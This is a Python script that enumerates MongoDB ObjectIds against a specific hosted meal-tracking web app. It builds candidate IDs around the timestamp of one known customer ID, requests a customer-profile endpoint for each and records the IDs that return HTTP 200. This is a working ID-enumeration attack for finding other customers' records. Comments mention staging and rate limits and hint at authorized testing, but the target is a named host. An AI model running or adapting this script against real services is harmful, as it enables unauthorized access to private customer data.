import logging
import secrets
import time
from datetime import datetime, timezone

import requests
from bson import ObjectId


# ============================================================
# CONFIG
# ============================================================

BASE_URL = "https://tiffin-tracker-5z09.onrender.com"
KITCHEN_ID = "6a5faeeb1196b4e10dcfa211"

KNOWN_CUSTOMER_ID = "6a902b0b70d53d7c139b48e9"

# Test customers created around this timestamp.
# Increase carefully in staging.
TIMESTAMP_WINDOW_SECONDS = 3600

# Random candidates to test for EACH timestamp.
# 1 = ~7,200 requests for a +/- 1 hour window.
CANDIDATES_PER_TIMESTAMP = 1

REQUEST_DELAY = 0.25

MAX_FOUND = 5

TIMEOUT = 10


# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%H:%M:%S",
)

log = logging.getLogger("objectid-test")


# ============================================================
# OBJECTID GENERATION
# ============================================================

def random_objectid_for_timestamp(timestamp: int) -> str:
    """
    Create a valid 12-byte MongoDB ObjectId whose first
    4 bytes contain the supplied Unix timestamp.

    The remaining 8 bytes are randomly generated.
    """

    timestamp_bytes = timestamp.to_bytes(4, "big")

    random_bytes = secrets.token_bytes(8)

    return str(
        ObjectId(timestamp_bytes + random_bytes)
    )


# ============================================================
# MAIN
# ============================================================

def main():

    start_time = time.monotonic()

    log.info("=" * 60)
    log.info("MongoDB ObjectId sampling test")
    log.info("=" * 60)

    log.info("Target: %s", BASE_URL)
    log.info("Kitchen: %s", KITCHEN_ID)

    # --------------------------------------------------------
    # Validate known ID
    # --------------------------------------------------------

    try:
        known_id = ObjectId(KNOWN_CUSTOMER_ID)
    except Exception:
        log.error("Invalid KNOWN_CUSTOMER_ID")
        return

    known_timestamp = known_id.generation_time
    known_ts = int(known_timestamp.timestamp())

    log.info(
        "Known ID timestamp: %s",
        known_timestamp.astimezone(timezone.utc).isoformat(),
    )

    start_ts = (
        known_ts - TIMESTAMP_WINDOW_SECONDS
    )

    end_ts = (
        known_ts + TIMESTAMP_WINDOW_SECONDS
    )

    log.info(
        "Timestamp range: %s → %s",
        datetime.fromtimestamp(
            start_ts,
            timezone.utc,
        ).isoformat(),
        datetime.fromtimestamp(
            end_ts,
            timezone.utc,
        ).isoformat(),
    )

    timestamp_count = end_ts - start_ts + 1

    total_candidates = (
        timestamp_count
        * CANDIDATES_PER_TIMESTAMP
    )

    log.info(
        "Timestamp values: %s",
        f"{timestamp_count:,}",
    )

    log.info(
        "Candidates: %s",
        f"{total_candidates:,}",
    )

    log.info(
        "Delay: %.2fs",
        REQUEST_DELAY,
    )

    log.info("-" * 60)

    # --------------------------------------------------------
    # Statistics
    # --------------------------------------------------------

    session = requests.Session()

    requests_sent = 0
    found = []

    status_counts = {}

    try:

        for timestamp in range(start_ts, end_ts + 1):

            for _ in range(CANDIDATES_PER_TIMESTAMP):

                candidate = random_objectid_for_timestamp(
                    timestamp
                )

                url = (
                    f"{BASE_URL}"
                    f"/api/customer/profile/"
                    f"{KITCHEN_ID}/daily/"
                    f"{candidate}"
                )

                try:

                    response = session.get(
                        url,
                        timeout=TIMEOUT,
                    )

                    requests_sent += 1

                    status = response.status_code

                    status_counts[status] = (
                        status_counts.get(status, 0) + 1
                    )

                    # Only report successful IDs.
                    # Never print response bodies.
                    if status == 200:

                        if candidate not in found:

                            found.append(candidate)

                            print(
                                candidate,
                                flush=True,
                            )

                            log.warning(
                                "FOUND customer ID #%d",
                                len(found),
                            )

                        if len(found) >= MAX_FOUND:

                            log.warning(
                                "Maximum discoveries reached."
                            )

                            return

                    elif status == 429:

                        log.warning(
                            "Rate limit reached after %d requests.",
                            requests_sent,
                        )

                        return

                except requests.RequestException as exc:

                    log.error(
                        "Request error: %s",
                        exc,
                    )

                # Progress every 100 requests.
                if requests_sent % 100 == 0:

                    elapsed = (
                        time.monotonic()
                        - start_time
                    )

                    rate = (
                        requests_sent / elapsed
                        if elapsed > 0
                        else 0
                    )

                    progress = (
                        requests_sent
                        / total_candidates
                        * 100
                    )

                    log.info(
                        "Progress: %s/%s (%.2f%%) | "
                        "%.2f req/s | found=%d",
                        f"{requests_sent:,}",
                        f"{total_candidates:,}",
                        progress,
                        rate,
                        len(found),
                    )

                time.sleep(REQUEST_DELAY)

    except KeyboardInterrupt:

        log.info("Stopped manually.")

    finally:

        elapsed = (
            time.monotonic()
            - start_time
        )

        rate = (
            requests_sent / elapsed
            if elapsed > 0
            else 0
        )

        log.info("=" * 60)
        log.info("FINAL RESULT")
        log.info("=" * 60)

        log.info(
            "Requests: %s",
            f"{requests_sent:,}",
        )

        log.info(
            "Elapsed: %.2fs",
            elapsed,
        )

        log.info(
            "Rate: %.2f req/s",
            rate,
        )

        log.info(
            "HTTP statuses: %s",
            status_counts,
        )

        log.info(
            "IDs discovered: %d",
            len(found),
        )

        if not found:

            log.info(
                "No IDs discovered."
            )

            log.info(
                "This means no sampled ObjectId matched "
                "an existing customer."
            )


if __name__ == "__main__":
    main()